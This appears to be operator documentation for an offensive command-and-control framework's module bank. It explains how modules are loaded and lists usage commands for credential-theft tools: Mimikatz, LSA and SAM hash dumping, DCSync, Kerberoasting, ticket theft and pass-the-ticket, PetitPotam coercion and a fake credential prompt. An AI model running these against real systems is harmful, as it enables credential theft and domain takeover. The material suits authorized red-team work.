# Local module bank

Use the module bank when you have a compiled tool and want to run it by name in the **server or VPN client console**. Undertow loads packaged BOFs, native modules, WASM modules, and .NET Framework assemblies from `modules/` when that console process starts. These are local, session-scoped commands. Loading reads each artifact into the console process; Undertow sends its bytes to the selected agent only when you run the command.

| I want to... | Start here |
| --- | --- |
| Run a packaged tool | In the console, type `modules`, `help NAME`, `use NUMBER`, then `NAME` as shown below. |
| Add a tool I already compiled | Put its artifact and optional JSON sidecar on the **console host** under `modules/`, then start or reattach the console. |
| Build a new tool | Follow the [WASM](wasm-development.md), [native Windows module](native-modules.md), [BOF](bof-compatibility.md), or [.NET assembly](assembly-modules.md) guide, then add the resulting file here. |

The repository ships runnable files in `modules/bof/`, `modules/native/`, and `modules/wasm/`. To add your own, copy a compatible `.o`, `.module`, or `.wasm` file anywhere below `modules/`, or a managed `.exe`/`.dll` under `modules/assembly/`, then start or reattach a console. Other `.exe` and `.dll` files under `modules/` are ignored. You may also set `UNDERTOW_MODULES_DIR` to an absolute directory before starting the console. Without that variable, Undertow looks for `modules/` in the current working directory, beside the Undertow executable, then in its parent directory (the usual `bin/undertow.exe` layout). The artifact stays on the **console host**, not on the agent; no agent redeployment is needed for a new module file.

```text
undertow> modules
undertow> help bof-winver
undertow> help module-wininfo
undertow> help wasm-triage
undertow> use 1
undertow[TALON]> module-wininfo
undertow[TALON]> wasm-triage --background
undertow[TALON]> job output 1
```

## Shipped modules

The repository includes **45 compiled modules** with help sidecars. Start or reattach a console from this checkout so it scans `modules/`, type `modules` to confirm what loaded, then `agents` and `use NUMBER` to select the target. The examples below are commands to type **inside the selected-agent console**. Run `help COMMAND` before a command to see its local help; the module file is sent to the agent when you invoke it.

### WASM host assessment (Windows or Linux agents)

| Console command | What it does | Basic use |
| --- | --- | --- |
| [wasm-triage](../modules/wasm/triage/README.md) | Summarizes host, OS, user, and privilege context. | `wasm-triage` |
| [wasm-inventory](../modules/wasm/inventory/README.md) | Lists processes, services, connections, and neighbours; an optional word filters output. | `wasm-inventory tcp` |
| [wasm-artifact-discovery](../modules/wasm/artifact-discovery/README.md) | Lists interesting file names and metadata under the agent user's home directory or a chosen root; it does not print file contents. | `wasm-artifact-discovery` |
| [wasm-privilege-audit](../modules/wasm/privilege-audit/README.md) | Checks Windows policy and service path configuration; on Linux, checks UID/GID and selected writable paths. | `wasm-privilege-audit` |
| [wasm-persistence-audit](../modules/wasm/persistence-audit/README.md) | Reports service startup and user autoruns. | `wasm-persistence-audit` |
| [wasm-enterprise-posture](../modules/wasm/enterprise-posture/README.md) | Reports domain environment, DNS, and OS policy locations. | `wasm-enterprise-posture` |

For `wasm-artifact-discovery`, add an **agent-side** root such as `wasm-artifact-discovery /home/analyst`; `--stdin ./patterns.txt` adds name patterns from a file on the console host. See the [WASM examples](../modules/wasm/README.md) and each example's README for platform-specific output and build instructions.

### Native modules (Windows AMD64 agents)

| Console command | What it does | Basic use |
| --- | --- | --- |
| [module-hello](../modules/native/README.md) | Demonstrates native arguments, output, status, and cancellation. | `module-hello one "two words"` |
| [module-wininfo](../modules/native/README.md) | Reports Windows computer, process, architecture, and memory information. | `module-wininfo` |
| [module-hostcheck](../modules/native/README.md) | Reports user, token elevation, integrity, privileges, and network adapters. | `module-hostcheck` |
| [module-sift](../modules/native/sift/README.md) | Scans a file or directory with the packaged Sift rules. | `module-sift local C:\Audit --json` |
| [module-askpass](../modules/native/askpass/README.md) | Displays a Windows credential dialog on the agent's desktop. | `module-askpass "Credential test" "Enter test account credentials"` |

`module-askpass` needs a visible interactive Windows desktop; a headless agent session cannot show its dialog. It returns submitted values in module output. `module-sift` can report matched values, so treat its output and saved jobs as sensitive. Replace the example `C:\Audit` with a file or directory on the selected agent.

**Long-running Sift scans:** Sift can run for an extended time across large directories, shares, or a domain; its file and host limits are unset by default. Run `module-sift --background local C:\Audit --json` to keep the console available, then use `jobs`, `job output JOB_ID`, and `job stop JOB_ID` to inspect or stop it. Use `help module-sift` or `module-sift --help` for its local, network, and domain scan modes and optional limits. See the [native examples](../modules/native/README.md), [Sift guide](../modules/native/sift/README.md), and [askpass guide](../modules/native/askpass/README.md).

### BOFs (Windows AMD64 agents)

The 34 packaged BOFs come from the linked open source projects. The console loads each `.x64.o` with a typed argument sidecar. Run `help bof-NAME` for the exact argument types. Commands below run **inside a selected-agent console**; uppercase values are placeholders. Several return credentials or change Kerberos ticket state. The [BOF compatibility guide](bof-compatibility.md) explains inspection and adding your own objects.

**[Adrenaline](https://github.com/atomiczsec/Adrenaline)**

| Command | Purpose | Basic use |
| --- | --- | --- |
| `bof-ai-surface` | Locate AI tools, agent profiles, and MCP configuration artifacts. | `bof-ai-surface` |
| `bof-clipboard` | Read the current text clipboard. | `bof-clipboard` |
| `bof-notepad-grab` | Read text from open Notepad windows. | `bof-notepad-grab` |
| `bof-powershell-history` | Find PSReadLine history and PowerShell transcript excerpts. | `bof-powershell-history` |
| `bof-window-list` | List visible windows; `/pid` adds process information. | `bof-window-list /pid` |

Adrenaline credits [NoteThief](https://github.com/trainr3kt/NoteThief) as the basis for `notepad-grab`.

**[BOFKatz](https://github.com/KrakenEU/BOFKatz)**

| Command | Purpose | Basic use |
| --- | --- | --- |
| `bof-kiwi` | Run the in-memory Mimikatz wrapper; its default command is `coffee`. | `bof-kiwi` |

**[C2-Tool-Collection](https://github.com/outflanknl/C2-Tool-Collection)** (Outflank)

| Command | Purpose | Basic use |
| --- | --- | --- |
| `bof-kerberoast` | List SPN-enabled accounts or request service tickets. | `bof-kerberoast list` |
| `bof-petitpotam` | Ask a target to authenticate to a capture host via EFSRPC. | `bof-petitpotam CAPTURE_HOST TARGET_HOST` |
| `bof-reconad` | Query AD objects and attributes with a custom LDAP filter. | `bof-reconad custom "(objectClass=computer)" name 10 0 ""` |
| `bof-winver` | Show Windows version, build, and patch release. | `bof-winver` |

For `bof-kerberoast`, `roast` requests tickets and accepts an optional account filter. For `bof-reconad`, the final three fields are maximum results, Global Catalog switch (`0` or `1`), and optional `server:port`; empty uses the default. The [Outflank source](https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF) has further modes and original credits.

**[CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF)** (TrustedSec)

| Command | Purpose | Basic use |
| --- | --- | --- |
| `bof-adcs-enum` | Enumerate AD Certificate Services authorities and templates. | `bof-adcs-enum ""` |
| `bof-enumlocalsessions` | List local and RDP user sessions. | `bof-enumlocalsessions` |
| `bof-ldapsearch` | Search LDAP, selecting attributes, count, scope, host, DN, and LDAPS. | `bof-ldapsearch "(objectClass=computer)" "name,dNSHostName" 10 3 "" "" 0` |
| `bof-listdns` | List DNS cache entries and resolve each name. | `bof-listdns` |

For `bof-adcs-enum`, `""` means the current domain. For `bof-ldapsearch`, `3` is the upstream default scope, the empty host and DN use discovered defaults, and final `0` disables LDAPS. See the [upstream command reference](https://github.com/trustedsec/CS-Situational-Awareness-BOF#readme) for more search options.

**[Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF)**

Kerbeus takes its `/option:value` switches as **one quoted argument** in Undertow. Keep the quotes when supplying more than one switch. The [upstream reference](https://github.com/RalfHacker/Kerbeus-BOF#readme) documents further flags and ticket formats.

| Command | Purpose | Basic use |
| --- | --- | --- |
| `bof-asktgt` | Request a ticket-granting ticket using an account key. | `bof-asktgt "/user:USER /rc4:HASH"` |
| `bof-asktgs` | Request a service ticket using a base64 TGT. | `bof-asktgs "/ticket:BASE64 /service:SPN"` |
| `bof-asreproasting` | Request an AS-REP for an account without preauthentication. | `bof-asreproasting "/user:USER"` |
| `bof-changepw` | Change an account password using a ticket. | `bof-changepw "/ticket:BASE64 /new:PASSWORD"` |
| `bof-cross-s4u` | Request a cross-domain S4U service ticket. | `bof-cross-s4u "/ticket:BASE64 /service:SPN /targetdomain:DOMAIN /targetdc:DC /impersonateuser:USER"` |
| `bof-describe` | Decode and describe a base64 Kerberos ticket. | `bof-describe "/ticket:BASE64"` |
| `bof-dump` | Export tickets from accessible logon sessions. | `bof-dump` |
| `bof-hash` | Calculate Kerberos key hashes from a password. | `bof-hash "/password:PASSWORD"` |
| `bof-klist` | List tickets in accessible logon sessions. | `bof-klist` |
| `bof-ptt` | Import a base64 ticket into a logon session. | `bof-ptt "/ticket:BASE64"` |
| `bof-purge` | Purge tickets from a logon session. | `bof-purge` |
| `bof-renew` | Renew a base64 ticket-granting ticket. | `bof-renew "/ticket:BASE64"` |
| `bof-s4u` | Request a constrained delegation S4U service ticket. | `bof-s4u "/ticket:BASE64 /service:SPN /impersonateuser:USER"` |
| `bof-tgtdeleg` | Request a delegated TGT for the current user. | `bof-tgtdeleg` |
| `bof-triage` | Summarize tickets in accessible logon sessions. | `bof-triage` |

**[DCSync-Bof](https://github.com/P0142/DCSync-Bof)**

| Command | Purpose | Basic use |
| --- | --- | --- |
| `bof-dcsync-single` | Request replication data for one domain account. | `bof-dcsync-single USER 0 "" "" 0` |
| `bof-dcsync-all` | Request replication data for accounts in a domain or OU. | `bof-dcsync-all "" "" 0` |

These need an authenticated domain context with directory replication rights. Their fields mirror the [upstream commands](https://github.com/P0142/DCSync-Bof#usage): `0` means the account is a name rather than a DN, empty strings use the default OU/DC, and final `0` disables LDAPS.

**[LSAdump-BOF](https://github.com/shashinma/LSAdump-BOF)**

| Command | Purpose | Basic use |
| --- | --- | --- |
| `bof-lsadump-cache` | Extract cached domain credential hashes; requires SYSTEM. | `bof-lsadump-cache` |
| `bof-lsadump-sam` | Extract local account NTLM hashes; requires administrator rights. | `bof-lsadump-sam` |
| `bof-lsadump-secrets` | Extract LSA secrets; requires SYSTEM. | `bof-lsadump-secrets` |

The old loader demonstration BOFs are kept under `internal/bof/testdata/examples/` for development tests. They no longer appear as operator commands.

Startup names are `bof-`, `module-`, or `wasm-` followed by the filename stem, lowercased. A final `.x64`, `.amd64`, `.win64`, or `.windows-amd64` before the extension is removed. Thus `network.x64.o` becomes `bof-network` and `wininfo.module` becomes `module-wininfo`. Names must begin with a lowercase ASCII letter, contain only lowercase ASCII letters, digits, and hyphens, and be at most 64 characters. A duplicate name or invalid artifact is reported as a preload warning and skipped. Built-in console commands cannot be replaced.

Use `help` to see every loaded command. `help NAME` shows its usage and original file path; `bofs` lists BOFs and `modules` lists all three formats. The loaded bytes remain usable if the source file changes or disappears during the session. Nothing is persisted in the server. After updating a file, restart the console or use `unload TYPE NAME` followed by `load TYPE FILE [NAME]`.

## Help and argument metadata

Put a JSON sidecar next to the artifact using either `tool.o.json` or `tool.json` (and similarly for `.module` or `.wasm`). The extension-specific name takes precedence. Every packaged artifact has a sidecar with a short description, usage, and help text.

For a native module or WASM file, a sidecar may contain `description`, `usage`, and `help`:

```json
{
  "description": "Read Windows host information",
  "usage": "wininfo",
  "help": "Uses ordinary Windows APIs. No arguments required."
}
```

Native and WASM command arguments are passed as UTF-8 strings through their existing execution paths. Native commands accept `--data FILE`; WASM commands accept `--stdin FILE`. Both accept `--background` before or after command arguments. `--` ends Undertow option parsing for that invocation.

For BOFs, use the existing [BOF manifest](bof-compatibility.md) to describe typed arguments. It supports `name`, `description`, `usage`, `help`, `entrypoint`, and an `arguments` array with `name`, `type`, and `required`. Types are `int`, `short`, `string`, `wstring`, and `binary`. A BOF sidecar is the reliable way to make typed arguments work without an operator typing `--format` each run. Without a sidecar or an explicit format, supplied BOF arguments are encoded as ANSI strings. To assign a format just for the current session, run `load bof FILE ALIAS --format zi` and then invoke `ALIAS` normally.

Use `load bof FILE [NAME]`, `load module FILE [NAME]`, `load wasm FILE [NAME]`, or `load assembly FILE [NAME]` to register a file during the current console session. Manually loaded commands use the given alias, or the unprefixed filename stem when no alias is given. `unload bof|module|wasm|assembly NAME` removes a command. BOFs still support `run-bof`, native modules `run-native`, WASM modules `run-wasm`, and .NET Framework assemblies `run-assembly` for one-off use.

The four formats remain separate: `.o` is a Windows AMD64 BOF with the conventional Beacon ABI, `.module` is an Undertow native DLL container with `undertow_native_v1`, `.wasm` is portable WASI with `undertow_host_v1`, and `.exe`/`.dll` under `modules/assembly/` is a managed .NET Framework assembly. See the [BOF](bof-compatibility.md), [native](native-modules.md), [WASM](wasm-development.md), and [.NET assembly](assembly-modules.md) guides.

Back to [documentation home](README.md).
